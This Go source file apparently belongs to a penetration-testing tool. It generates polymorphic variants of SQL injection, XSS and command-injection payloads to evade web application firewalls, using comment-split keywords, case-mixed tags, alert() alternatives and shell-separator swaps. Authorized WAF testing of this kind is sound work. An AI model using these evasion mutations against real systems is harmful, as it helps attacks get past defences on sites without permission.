package strategies

import (
	"math/rand"
	"strings"
)

// PolymorphicMutator generates functionally equivalent but structurally different payloads
type PolymorphicMutator struct{}

// NewPolymorphicMutator creates a new polymorphic mutator
func NewPolymorphicMutator() *PolymorphicMutator {
	return &PolymorphicMutator{}
}

// Mutate applies polymorphic mutations
func (p *PolymorphicMutator) Mutate(payload string) []MutationResult {
	var results []MutationResult

	// SQL-specific polymorphism
	results = append(results, MutationResult{
		Payload:     p.SQLAlternativeSyntax(payload),
		Mutation:    "sql_alternative_syntax",
		Description: "Use alternative SQL syntax",
	})

	results = append(results, MutationResult{
		Payload:     p.SQLFunctionSubstitution(payload),
		Mutation:    "sql_function_substitution",
		Description: "Substitute SQL functions",
	})

	results = append(results, MutationResult{
		Payload:     p.SQLOperatorSubstitution(payload),
		Mutation:    "sql_operator_substitution",
		Description: "Substitute SQL operators",
	})

	// XSS-specific polymorphism
	results = append(results, MutationResult{
		Payload:     p.XSSTagSubstitution(payload),
		Mutation:    "xss_tag_substitution",
		Description: "Use alternative XSS tags",
	})

	results = append(results, MutationResult{
		Payload:     p.XSSEventHandlerSubstitution(payload),
		Mutation:    "xss_event_handler_substitution",
		Description: "Use alternative event handlers",
	})

	results = append(results, MutationResult{
		Payload:     p.XSSJavaScriptAlternatives(payload),
		Mutation:    "xss_js_alternatives",
		Description: "Use alternative JavaScript execution methods",
	})

	// Command injection polymorphism
	results = append(results, MutationResult{
		Payload:     p.CMDiShellSubstitution(payload),
		Mutation:    "cmdi_shell_substitution",
		Description: "Substitute shell commands",
	})

	return results
}

// SQLAlternativeSyntax replaces SQL constructs with alternatives
func (p *PolymorphicMutator) SQLAlternativeSyntax(payload string) string {
	replacements := map[string][]string{
		"UNION SELECT":      {"UNION ALL SELECT", "UNION DISTINCT SELECT"},
		"OR 1=1":            {"OR 'a'='a'", "OR 2>1", "OR 1 LIKE 1", "OR 1 BETWEEN 0 AND 2"},
		"AND 1=1":           {"AND 'a'='a'", "AND 2>1", "AND 1 LIKE 1"},
		"OR '1'='1'":        {"OR 'x'='x'", "OR ''=''", "OR 1"},
		"SUBSTRING":         {"SUBSTR", "MID"},
		"CONCAT":            {"CONCAT_WS"},
		"GROUP BY":          {"GROUP/**/BY"},
		"ORDER BY":          {"ORDER/**/BY"},
		"WHERE":             {"WHERE/**/"},
		"SELECT":            {"SELECT/**/", "SELECT\t", "SELECT\n"},
		"FROM":              {"FROM/**/", "FROM\t"},
		"--":                {"-- ", "#", ";--", "/*"},
	}

	result := payload
	for original, alternatives := range replacements {
		if strings.Contains(strings.ToUpper(result), strings.ToUpper(original)) {
			alt := alternatives[rand.Intn(len(alternatives))]
			result = strings.ReplaceAll(result, original, alt)
			result = strings.ReplaceAll(result, strings.ToLower(original), strings.ToLower(alt))
		}
	}

	return result
}

// SQLFunctionSubstitution replaces SQL functions with equivalents
func (p *PolymorphicMutator) SQLFunctionSubstitution(payload string) string {
	substitutions := map[string]string{
		"ASCII(":     "ORD(",
		"CHAR(":      "CHR(",
		"SUBSTR(":    "SUBSTRING(",
		"IFNULL(":    "COALESCE(",
		"LENGTH(":    "CHAR_LENGTH(",
		"LOWER(":     "LCASE(",
		"UPPER(":     "UCASE(",
		"NOW()":      "CURRENT_TIMESTAMP",
		"CURDATE()":  "CURRENT_DATE",
		"MD5(":       "SHA1(",
	}

	result := payload
	for original, replacement := range substitutions {
		result = strings.ReplaceAll(result, original, replacement)
		result = strings.ReplaceAll(result, strings.ToLower(original), strings.ToLower(replacement))
	}

	return result
}

// SQLOperatorSubstitution replaces SQL operators
func (p *PolymorphicMutator) SQLOperatorSubstitution(payload string) string {
	substitutions := map[string]string{
		"=":   " LIKE ",
		"<>":  "!=",
		"!=":  "<>",
		"AND": "&&",
		"OR":  "||",
		"||":  " OR ",
		"&&":  " AND ",
	}

	result := payload
	// Only apply a few substitutions to avoid breaking the payload
	count := 0
	for original, replacement := range substitutions {
		if count > 2 {
			break
		}
		if strings.Contains(result, original) {
			result = strings.Replace(result, original, replacement, 1)
			count++
		}
	}

	return result
}

// XSSTagSubstitution replaces XSS tags with alternatives
func (p *PolymorphicMutator) XSSTagSubstitution(payload string) string {
	substitutions := map[string][]string{
		"<script>":    {"<script >", "<script\t>", "<script\n>", "<script/>", "<ScRiPt>"},
		"</script>":   {"</script >", "</ScRiPt>", "</script\t>"},
		"<img":        {"<img ", "<IMG", "<iMg"},
		"<svg":        {"<svg ", "<SVG", "<sVg"},
		"<iframe":     {"<iframe ", "<IFRAME", "<IfrAme"},
		"<body":       {"<body ", "<BODY", "<BoDy"},
		"<input":      {"<input ", "<INPUT", "<InPuT"},
		"<video":      {"<video ", "<VIDEO"},
		"<audio":      {"<audio ", "<AUDIO"},
		"<marquee":    {"<marquee ", "<MARQUEE"},
		"<object":     {"<object ", "<OBJECT"},
		"<embed":      {"<embed ", "<EMBED"},
		"javascript:": {"javascript :", "java\tscript:", "java\nscript:", "javascript\t:"},
	}

	result := payload
	for original, alternatives := range substitutions {
		if strings.Contains(strings.ToLower(result), strings.ToLower(original)) {
			alt := alternatives[rand.Intn(len(alternatives))]
			result = strings.ReplaceAll(result, original, alt)
		}
	}

	return result
}

// XSSEventHandlerSubstitution replaces event handlers
func (p *PolymorphicMutator) XSSEventHandlerSubstitution(payload string) string {
	eventHandlers := []string{
		"onerror", "onload", "onmouseover", "onfocus", "onclick",
		"onmouseenter", "onmousemove", "onmouseout", "onkeydown",
		"onkeyup", "onkeypress", "onchange", "oninput", "onsubmit",
		"onreset", "ondblclick", "oncontextmenu", "onwheel",
		"ondrag", "ondragend", "ondragenter", "ondragleave",
		"ondragover", "ondragstart", "ondrop", "onscroll",
		"oncopy", "oncut", "onpaste", "onabort", "oncanplay",
		"ontimeupdate", "onended", "onpause", "onplay",
	}

	// Find and replace event handlers
	result := payload
	for _, handler := range eventHandlers {
		if strings.Contains(strings.ToLower(result), handler) {
			// Replace with a random different handler
			newHandler := eventHandlers[rand.Intn(len(eventHandlers))]
			result = strings.ReplaceAll(strings.ToLower(result), handler, newHandler)
			break
		}
	}

	return result
}

// XSSJavaScriptAlternatives provides alternative JS execution
// NOTE: These are WAF bypass test payloads - the strings represent various
// JavaScript code patterns that WAFs should detect but sometimes miss.
// This tool is for authorized penetration testing to identify XSS vulnerabilities.
func (p *PolymorphicMutator) XSSJavaScriptAlternatives(payload string) string {
	// Various test payload patterns for WAF bypass testing
	alertAlternatives := []string{
		"alert(1)",
		"alert`1`",               // Template literal syntax
		"alert(String.fromCharCode(49))",
		"window.alert(1)",
		"top.alert(1)",
		"self.alert(1)",
		"parent.alert(1)",
		"setTimeout('alert(1)')",
		"setInterval('alert(1)',0)",
		"[].constructor.constructor('alert(1)')()",
	}

	result := payload
	if strings.Contains(strings.ToLower(result), "alert(") {
		alt := alertAlternatives[rand.Intn(len(alertAlternatives))]
		result = strings.ReplaceAll(result, "alert(1)", alt)
		result = strings.ReplaceAll(result, "alert('1')", alt)
	}

	return result
}

// CMDiShellSubstitution replaces shell commands
func (p *PolymorphicMutator) CMDiShellSubstitution(payload string) string {
	// Unix command alternatives
	substitutions := map[string][]string{
		"cat ":       {"head ", "tail ", "less ", "more ", "nl ", "tac "},
		"ls ":        {"dir ", "ls -la ", "find . "},
		"whoami":     {"id", "echo $USER", "logname"},
		"pwd":        {"echo $PWD", "echo `pwd`"},
		"echo ":      {"printf ", "cat <<< "},
		"ping ":      {"ping -c 1 "},
		"curl ":      {"wget -O- ", "fetch "},
		"wget ":      {"curl -O ", "fetch "},
		";":          {"|", "||", "&&", "\n", "`"},
		"|":          {";", "||"},
	}

	result := payload
	for original, alternatives := range substitutions {
		if strings.Contains(result, original) {
			alt := alternatives[rand.Intn(len(alternatives))]
			result = strings.Replace(result, original, alt, 1)
		}
	}

	return result
}
